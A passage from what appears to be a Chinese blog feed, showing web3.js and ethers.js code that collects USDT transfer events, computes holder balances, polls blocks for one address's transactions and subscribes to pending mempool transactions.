class="hljs-keyword">const</span> eventsData = []<br><span class="hljs-comment">// 存储所有的地址和相应的余额</span><br><span class="hljs-keyword">const</span> result = []<br><span class="hljs-comment">// 获取地址</span><br><span class="hljs-keyword">await</span> usdt.getPastEvents(<span class="hljs-string">&#x27;Transfer&#x27;</span>,<br>  &#123;<br>    <span class="hljs-attr">fromBlock</span>: blocknumber - <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">toBlock</span>: <span class="hljs-string">&#x27;latest&#x27;</span><br>  &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">err, events</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> l = events.length<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;.....&quot;</span>, l);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; l; i++) &#123;<br>      <span class="hljs-keyword">const</span> toAdd = events[i].returnValues.to<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;.....&quot;</span>, toAdd);<br>      eventsData.push(toAdd)<br>    &#125;<br>    <span class="hljs-built_in">console</span>.log(eventsData)<br>  &#125;);<br><span class="hljs-comment">// 获取余额</span><br><span class="hljs-keyword">const</span> len2 = eventsData.length<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len2; i++) &#123;<br>  <span class="hljs-keyword">await</span> usdt.methods.balances(eventsData[i]).call().then(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">amount</span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;balances:&#x27;</span>, amount);<br>    <span class="hljs-keyword">const</span> data = &#123;<br>      <span class="hljs-string">&quot;address&quot;</span>: eventsData[i],<br>      <span class="hljs-string">&quot;amount&quot;</span>: amount<br>    &#125;<br>    result.push(data)<br><br>  &#125;);<br>  <span class="hljs-comment">// 写入json文件</span><br>  <span class="hljs-keyword">let</span> str = <span class="hljs-built_in">JSON</span>.stringify(result, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;\t&quot;</span>)<br>  fs.writeFile(<span class="hljs-string">&#x27;data.json&#x27;</span>, str, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (err) &#123; res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Server is error...&#x27;</span>) &#125;<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这种方法有一些问题</p><ol><li>一个地址多次接收到转账，account 地址重复</li><li>查询 balanceOf 会受到网络速度以及provider rate limit的限制，比较低效</li></ol><p><strong>第二种方法</strong></p><p>拿到所有的 usdt 的address和amount，拉取从合约部署开始到现在的所有 Transfer event，并自己计算出所涉及到地址的余额</p><p>首先是最近一万个区块，可以在本机上完成</p><p>由于 alchemy 等节点的限制，每次获取的事件不能过多，于是写了一个循环来分批获取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//  一个 k-v 对象</span><br><span class="hljs-keyword">const</span> accountdata = &#123;&#125;<br><span class="hljs-keyword">let</span> eventdata = []<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>  blocknumber -= <span class="hljs-number">1000</span><br>  <span class="hljs-keyword">await</span> usdt.getPastEvents(<span class="hljs-string">&#x27;Transfer&#x27;</span>,<br>    &#123;<br>      <span class="hljs-attr">fromBlock</span>: blocknumber - <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">toBlock</span>: blocknumber<br>    &#125;,<br>    <span class="hljs-function">(<span class="hljs-params">err, events</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 拼接数组</span><br>      eventdata = eventdata.concat(events)<br><br>    &#125;);<br><br>  <span class="hljs-keyword">const</span> l2 = eventdata.length<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;.....&quot;</span>, l2);<br>&#125;<br><br><span class="hljs-comment">// 计算</span><br><span class="hljs-keyword">const</span> l = eventdata.length<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; l; i++) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">from</span> = eventdata[i].returnValues.from<br>  <span class="hljs-keyword">const</span> to = eventdata[i].returnValues.to<br>  <span class="hljs-keyword">const</span> amount = <span class="hljs-built_in">parseInt</span>(eventdata[i].returnValues.value)<br>  <span class="hljs-comment">// 如果是第一次出现的地址，进行初始化操作</span><br>  <span class="hljs-keyword">if</span> (accountdata[<span class="hljs-keyword">from</span>] == <span class="hljs-literal">undefined</span>) &#123;<br>    accountdata[<span class="hljs-keyword">from</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-comment">// console.log(&quot;...1&quot;)</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (accountdata[to] == <span class="hljs-literal">undefined</span>) &#123;<br>    accountdata[to] = <span class="hljs-number">0</span><br>    <span class="hljs-comment">// console.log(&quot;...2&quot;)</span><br><br>  &#125;<br>  accountdata[<span class="hljs-keyword">from</span>] -= amount<br>  accountdata[to] += amount<br>&#125;<br><span class="hljs-comment">// console.log(accountdata)</span><br><span class="hljs-comment">//写入json文件</span><br><span class="hljs-keyword">let</span> str = <span class="hljs-built_in">JSON</span>.stringify(accountdata, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;\t&quot;</span>)<br>fs.writeFile(<span class="hljs-string">&#x27;data.json&#x27;</span>, str, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (err) &#123; res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Server is error...&#x27;</span>) &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>从初始区块开始的拉取和计算，需要借助服务器来进行</p><p>但在本机，拉取仍然可以克服 js 的 memory 限制</p><p>做法是每拉取一万个区块的数据，就对 json 文件进行一次写入，并清除 js 中数组存储的数据，防止 memory 溢出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> accountdata = &#123;&#125;<br><span class="hljs-keyword">let</span> eventdata = []<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>  blocknumber -= <span class="hljs-number">1000</span><br>  <span class="hljs-keyword">await</span> usdt.getPastEvents(<span class="hljs-string">&#x27;Transfer&#x27;</span>,<br>    &#123;<br>      <span class="hljs-attr">fromBlock</span>: blocknumber - <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">toBlock</span>: blocknumber<br>    &#125;,<br>    <span class="hljs-function">(<span class="hljs-params">err, events</span>) =&gt;</span> &#123;<br>      eventdata = eventdata.concat(events)<br>      <span class="hljs-keyword">if</span> (i % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">let</span> str = <span class="hljs-built_in">JSON</span>.stringify(eventdata, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;\t&quot;</span>)<br>        fs.writeFile(<span class="hljs-string">&#x27;test7/&#x27;</span> + i + <span class="hljs-string">&#x27;data.json&#x27;</span>, str, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (err) &#123; res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Server is error...&#x27;</span>) &#125;<br>        &#125;)<br>        eventdata = []<br>      &#125;<br>    &#125;);<br><br>  <span class="hljs-keyword">const</span> l2 = eventdata.length<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;.....&quot;</span>, l2);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="监听账户"><a href="#监听账户" class="headerlink" title="监听账户"></a>监听账户</h1><h2 id="所有交易活动"><a href="#所有交易活动" class="headerlink" title="所有交易活动"></a>所有交易活动</h2><p>利用 web3.eth.getBlock 来扫块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 交易检查器</span><br><span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">web3</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 在这里填入x</span><br>  <span class="hljs-keyword">const</span> account = <span class="hljs-string">&#x27;0x4281eCF07378Ee595C564a59048801330f3084eE&#x27;</span>.toLowerCase(); <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkLastBlock</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> block = <span class="hljs-keyword">await</span> web3.eth.getBlock(<span class="hljs-string">&#x27;latest&#x27;</span>);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`[*] Searching block <span class="hljs-subst">$&#123;block.number&#125;</span>...`</span>);<br>    <span class="hljs-keyword">if</span> (block &amp;&amp; block.transactions) &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> txHash <span class="hljs-keyword">of</span> block.transactions) &#123;<br>        <span class="hljs-keyword">let</span> tx = <span class="hljs-keyword">await</span> web3.eth.getTransaction(txHash);<br>        <span class="hljs-comment">// console.log(tx.from)</span><br>        <span class="hljs-keyword">if</span> (account == tx.from.toLowerCase()) &#123;<br>          <span class="hljs-keyword">let</span> lastBlockNumber = block.number<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`[+] Transaction found on block <span class="hljs-subst">$&#123;lastBlockNumber&#125;</span>`</span>);<br>          <span class="hljs-built_in">console</span>.log(&#123;<br>            <span class="hljs-comment">// txdata: tx,</span><br>            <span class="hljs-attr">toAddress</span>: tx.to,<br>            <span class="hljs-comment">// ether 金额</span><br>            <span class="hljs-attr">ETHvalue</span>: web3.utils.fromWei(tx.value, <span class="hljs-string">&#x27;ether&#x27;</span>),<br>            <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()<br>          &#125;);<br>            <span class="hljs-comment">// 解析出input中的内容</span><br>          <span class="hljs-keyword">let</span> inputdata = <span class="hljs-keyword">await</span> web3.eth.abi.decodeParameters(<br>            <span class="hljs-comment">// ERC20 transfer method args</span><br>            [<br>              &#123; <span class="hljs-attr">internalType</span>: <span class="hljs-string">&#x27;address&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;to&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span> &#125;,<br>              &#123; <span class="hljs-attr">internalType</span>: <span class="hljs-string">&#x27;uint256&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;uint256&#x27;</span> &#125;,<br>            ],<br>            <span class="hljs-string">`0x<span class="hljs-subst">$&#123;tx.input.substring(<span class="hljs-number">10</span>)&#125;</span>`</span><br>          );<br>          <span class="hljs-built_in">console</span>.log(inputdata)<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>底部的间隔功能每7秒检查一次当前区块。我选择此数字是因为以太坊的平均出块时间为15秒，我们不想错过任何区块。该程序的问题在于它不依赖统计异常值。例如如果一个区块在7秒内被挖掘，则可能会完全丢失该区块。而且如果我们尝试通过减少轮询间隔来缓解这种情况，则会发现我们需要一个非常快速的Internet连接来处理所有异步网络I/O。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;web3&#x27;</span>);<br><br><span class="hljs-keyword">const</span> BuildTransactionChecker = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./transactionChecker&#x27;</span>);<br><span class="hljs-keyword">const</span> CreateClient = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./ethClient&#x27;</span>);<br><br><span class="hljs-keyword">const</span> web3 = CreateClient(Web3);<br><span class="hljs-keyword">const</span> checkBlock = BuildTransactionChecker(web3)<br><br><span class="hljs-comment">// 每7秒检查一次当前区块</span><br><span class="hljs-comment">// 以太坊平均出块时间为15秒</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  checkBlock();<br>&#125;, <span class="hljs-number">7000</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/12/02/monitor/image-20221201124441267.png" alt="image-20221201124441267"></p><h2 id="余额"><a href="#余额" class="headerlink" title="余额"></a>余额</h2><p>结合合约和js的库：<a href="https://github.com/wbobeirne/eth-balance-checker#readme">Ethereum Balance Checker</a></p><p><strong>获取地址余额</strong></p><p><strong>参数</strong></p><ul><li><code>provider: Web3 | Ethers.Provider</code>- 用于合约调用的提供者。</li><li><code>address: string</code>- 查询余额的地址</li><li><code>tokens: string[]</code>- 代币合约地址数组。仅支持 ERC20 代币。</li><li><code>options?: Options</code>- 合约选项，选项见上。</li></ul><p><strong>退货</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">Promise&lt;&#123;<br>  <span class="hljs-regexp">//</span> Ether balance<br>  <span class="hljs-string">&quot;0x0&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>  <span class="hljs-regexp">//</span> Token balances<br>  <span class="hljs-string">&quot;0x123...&quot;</span>: <span class="hljs-string">&quot;500&quot;</span>,<br>  <span class="hljs-string">&quot;0x456...&quot;</span>: <span class="hljs-string">&quot;100000&quot;</span>,<br>  ...<br>&#125;&gt;<br></code></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> Web3 <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;web3&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; getAddressBalances &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;eth-balance-checker/lib/web3&#x27;</span>;<br><br><span class="hljs-keyword">const</span> web3 = <span class="hljs-keyword">new</span> Web3(...);<br><span class="hljs-keyword">const</span> address = <span class="hljs-string">&#x27;0x123...&#x27;</span>;<br><span class="hljs-keyword">const</span> tokens = [<span class="hljs-string">&#x27;0x0&#x27;</span>, <span class="hljs-string">&#x27;0x456...&#x27;</span>];<br>getAddressBalances(web3, address, tokens).then(<span class="hljs-function"><span class="hljs-params">balances</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(balances); <span class="hljs-comment">// &#123; &quot;0x0&quot;: &quot;100&quot;, &quot;0x456...&quot;: &quot;200&quot; &#125;</span><br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="待处理交易"><a href="#待处理交易" class="headerlink" title="待处理交易"></a>待处理交易</h1><p>要在以太坊网络编写或者更新任何内容，需要有人创建，签署和发送交易。交易是外部世界与以太坊网络通信的方式。当发送到以太坊网络时，交易会停留在称为“mempool”的队列中，交易等待旷工被处理——- 处于这种等待交易称为待处理交易。发送交易所需要的少量费用称为gas;交易被旷工包含在一个区块中，并且根据它们包含的给旷工的gas 价格来确定优先级 。</p><p>查看<a href="https://www.quicknode.com/guides/defi/how-to-access-ethereum-mempool">这里</a>, 将得到关于内存池和待处理交易的更多信息。</p><p>通过检查待处理的交易，可以执行以下操作：</p><ul><li>估计gas：理论上我们可以查看待处理的交易来预测下一个区块的最优gas价格。</li><li>用于交易分析：我们可以分析去中心化交易所中的待处理交易，以便预测市场趋势。</li><li>交易抢跑：在 DeFi 中，你可以预览即将到来的与价格（预言机）相关的交易，并可能对 MKR、COMP 和其他协议的保险库发出清算。</li></ul><p>应用此方法我们可以完成一个简单的套利机器人</p><h2 id="ether-js"><a href="#ether-js" class="headerlink" title="ether.js"></a>ether.js</h2><p>订阅事件：<a href="https://docs.ethers.io/v5/single-page/#/v5/api/providers/provider/-%23-Provider--events">ether.js Event</a></p><p>我们将使用WebSockets处理这些待处理的交易流</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ethers = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;ethers&quot;</span>);<br><span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;wss&quot;</span>;<br><br><span class="hljs-keyword">var</span> init = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> customWsProvider = <span class="hljs-keyword">new</span> ethers.providers.WebSocketProvider(url);<br>  <span class="hljs-built_in">console</span>.log(customWsProvider.listeners.toString())<br>  customWsProvider.on(<span class="hljs-string">&quot;pending&quot;</span>, <span class="hljs-function">(<span class="hljs-params">tx</span>) =&gt;</span> &#123;<br>    customWsProvider.getTransaction(tx).then(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">transaction</span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(transaction);<br>    &#125;);<br>  &#125;);<br><br>  customWsProvider._websocket.on(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Unable to connect to <span class="hljs-subst">$&#123;ep.subdomain&#125;</span> retrying in 3s...`</span>);<br>    <span class="hljs-built_in">setTimeout</span>(init, <span class="hljs-number">3000</span>);<br>  &#125;);<br>  customWsProvider._websocket.on(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-keyword">async</span> (code) =&gt; &#123;<br>    <span class="hljs-built_in">console</span>.log(<br>      <span class="hljs-string">`Connection lost with code <span class="hljs-subst">$&#123;code&#125;</span>! Attempting reconnect in 3s...`</span><br>    );<br>    customWsProvider._websocket.terminate();<br>    <span class="hljs-built_in">setTimeout</span>(init, <span class="hljs-number">3000</span>);<br>  &#125;);<br>&#125;;<br><br>init();<br></code></pre></td></tr></table></figure><h2 id="web3-js"><a href="#web3-js" class="headerlink" title="web3.js"></a>web3.js</h2><p>订阅事件：<a href="https://web3js.readthedocs.io/en/v1.8.1/web3-eth-subscribe.html#">https://web3js.readthedocs.io/en/v1.8.1/web3-eth-subscribe.html#</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// const &#123; default: Web3 &#125; = require(&#x27;web3&#x27;)</span><br><br><span class="hljs-keyword">const</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;web3&#x27;</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransactionChecker</span> </span>&#123;<br>  Web3;<br>  web3ws;<br>  account;<br>  subscription;<br><br>  <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params">projectId, account</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.web3ws = <span class="hljs-keyword">new</span> Web3(<span class="hljs-keyword">new</span> Web3.providers.WebsocketProvider(<span class="hljs-string">&#x27;wss://eth-goerli.g.alchemy.com/v2/&#x27;</span> + projectId,<br>      &#123;<br>        <span class="hljs-attr">clientConfig</span>: &#123;<br>          <span class="hljs-attr">maxReceivedFrameSize</span>: <span class="hljs-number">100000000</span>,<br>          <span class="hljs-attr">maxReceivedMessageSize</span>: <span class="hljs-number">100000000</span>,<br>        &#125;<br>      &#125;<br>    ));<br>    <span class="hljs-built_in">this</span>.web3 = <span class="hljs-keyword">new</span> Web3(<span class="hljs-keyword">new</span> Web3.providers.HttpProvider(<span class="hljs-string">&#x27;https://eth-goerli.g.alchemy.com/v2/&#x27;</span> + projectId));<br>    <span class="hljs-built_in">this</span>.account = account.toLowerCase();<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-title">subscribe</span>(<span class="hljs-params">topic</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.subscription = <span class="hljs-built_in">this</span>.web3ws.eth.subscribe(topic, <span class="hljs-function">(<span class="hljs-params">err, res</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (err) <span class="hljs-built_in">console</span>.error(err);<br>    &#125;);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-title">watchTransactions</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Watching all pending transactions...&#x27;</span>);<br>    <span class="hljs-built_in">this</span>.subscription.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-keyword">async</span> (txHash) =&gt; &#123;<br>      <span class="hljs-comment">// setTimeout(async () =&gt; &#123;</span><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">let</span> tx = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.web3.eth.getTransaction(txHash);<br>        <span class="hljs-keyword">if</span> (tx != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-comment">// console.log(tx.from);</span><br>          <span class="hljs-comment">// 指定账户</span><br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.account == tx.from.toLowerCase()) &#123;<br>            <span class="hljs-built_in">console</span>.log(&#123;<br>              <span class="hljs-attr">addressFrom</span>: tx.from,<br>              <span class="hljs-attr">addressTo</span>: tx.to,<br>              <span class="hljs-attr">value</span>: <span class="hljs-built_in">this</span>.web3.utils.fromWei(tx.value, <span class="hljs-string">&#x27;ether&#x27;</span>),<br>              <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()<br>            &#125;)<br>          &#125;<br>        &#125;<br>      &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-built_in">console</span>.error(err);<br>      &#125;<br>      <span class="hljs-comment">// &#125;, 60000)</span><br>    &#125;)<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> txChecker = <span class="hljs-keyword">new</span> TransactionChecker(<span class="hljs-string">&#x27;KEY&#x27;</span>, <span class="hljs-string">&#x27;0x4281eCF07378Ee595C564a59048801330f3084eE&#x27;</span>);<br>txChecker.subscribe(<span class="hljs-string">&#x27;pendingTransactions&#x27;</span>);<br>txChecker.watchTransactions();<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.codeleading.com/article/83932116457/">web3js 监控以太坊代币交易</a></li><li><a href="https://juejin.cn/post/6844903757046611975">以太坊交易确认数如何获取</a></li><li><a href="https://blog.csdn.net/weixin_43988498/article/details/108127126">Web3-js的学习(5)-实现合约事件监听</a></li><li><a href="https://cloud.tencent.com/developer/news/485738">使用Web3.js监视以太坊地址活动状态</a> 原文：<a href="https://medium.com/coinmonks/monitoring-an-ethereum-address-with-web3-js-970c0a3cf96d">https://medium.com/coinmonks/monitoring-an-ethereum-address-with-web3-js-970c0a3cf96d</a></li><li><a href="https://zhuanlan.zhihu.com/p/36275344">捕捉智能合约中的 event 实战</a></li><li><a href="http://blog.hubwiz.com/2018/08/19/ethereum-web3j-track/">用web3.js追踪区块链交易</a></li><li><a href="https://blog.csdn.net/weixin_39998006/article/details/100520825">ethereum扫描区块，获取区块内的交易记录</a></li><li><a href="https://dev.to/mihaiandrei97/how-to-monitor-eth-transactions-using-web3js-46p7">如何使用 Web3.js 监控 ETH 交易</a></li><li><a href="https://community.infura.io/t/web3-js-how-to-track-erc-20-token-transfers-specific-address-token/5571">Web3.js：如何跟踪 ERC-20 代币传输（+ 特定地址/代币）</a></li><li><a href="https://docs.moonbeam.network/builders/build/eth-api/pubsub/">订阅活动</a></li><li><a href="https://stackoverflow.com/questions/69206293/web3js-how-to-show-pending-transactions-on-custom-blockchain">Web3js：如何在自定义区块链上显示未决交易</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;监听代币&quot;&gt;&lt;a href=&quot;#监听代币&quot; class=&quot;headerlink&quot; title=&quot;监听代币&quot;&gt;&lt;/a&gt;监听代币&lt;/h1&gt;&lt;p&gt;以 USDT 为例&lt;/p&gt;
&lt;p&gt;代币地址：&lt;a href=&quot;https://etherscan.io/address/0x</summary>
      
    
    
    
    
    <category term="js" scheme="http://example.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>DeFi 常用攻击手法研究报告</title>
    <link href="http://example.com/2022/11/30/DefiHack/"/>
    <id>http://example.com/2022/11/30/DefiHack/</id>
    <published>2022-11-30T10:19:57.000Z</published>
